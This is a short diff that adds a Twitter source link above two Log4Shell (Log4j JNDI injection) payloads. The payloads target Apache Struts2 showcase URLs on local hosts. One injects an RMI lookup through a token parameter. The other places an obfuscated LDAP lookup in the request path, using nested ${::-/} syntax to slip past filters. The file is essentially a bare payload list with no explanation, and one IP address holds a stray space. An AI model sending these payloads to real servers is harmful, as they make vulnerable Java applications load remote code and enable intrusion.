@@ -1,2 +1,5 @@
+# Source: https://twitter.com/sirifu4k1/status/1470011568834424837
+
+
 http://127.0.0.1:8080/struts2-showcase/token/transfer4.action -d http://struts.token.name='${jndi:rmi://127.0 .0.1:1099/ilysm}'
 http://localhost:8080/struts2-showcase/$%7Bjndi:ldap:$%7B::-/%7D/10.0.0.6:1270/abc%7D/
